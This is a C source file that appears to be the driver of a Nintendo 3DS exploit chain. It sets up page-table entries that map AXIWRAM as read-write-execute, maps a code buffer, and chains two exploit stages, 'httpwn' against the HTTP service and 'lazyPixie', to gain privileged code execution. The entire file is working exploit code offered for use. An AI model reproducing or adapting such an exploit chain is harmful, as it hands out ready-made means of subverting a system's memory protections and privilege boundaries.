#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include "lib/gsp.h"
#include "httpwn.h"
#include "lazy_pixie.h"

typedef struct ExploitChainLayout {
    u8 workBuf[0x1000];
    u8 hole[0x1000];
    BlobLayout blobLayout;
} ExploitChainLayout;

static void prepareL2Table(BlobLayout *layout)
{
    u32 *l2table = layout->l2table;

    // Map AXIWRAM RWX RWX Strongly ordered
    for(u32 offset = 0; offset < 0x80000; offset += 0x1000) {
        l2table[offset >> 12] = (0x1FF80000 + offset) | 0x432;
    }

    // Map the code buffer cacheable
    for(u32 offset = 0; offset < sizeof(layout->code); offset += 0x1000) {
        l2table[(0x80000 + offset) >> 12] = (convertLinearMemToPhys(layout->code) + offset) | 0x5B6;
    }
}

static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle)
{
    Handle httpcHandle;
    u32 selfSbufId, alignedHttpBuffer;
    Result res = 0;

    prepareL2Table(&layout->blobLayout);
    TRY(httpwn(&httpcHandle, &selfSbufId, &alignedHttpBuffer, layout->workBuf, layout->hole, gspHandle));
    lcdFill(0, 0xFF, 0);
    TRY(lazyPixie(&layout->blobLayout, httpcHandle, selfSbufId, alignedHttpBuffer));

    return res;
}

Result otherappMain(u32 paramBlk)
{
    Handle gspHandle = **(Handle **)(paramBlk + 0x58);
    ExploitChainLayout *layout = (ExploitChainLayout *)((paramBlk + 0x1000) & ~0xFFF);

    lcdFill(0,0,0);
    return doExploitChain(layout, gspHandle);
}
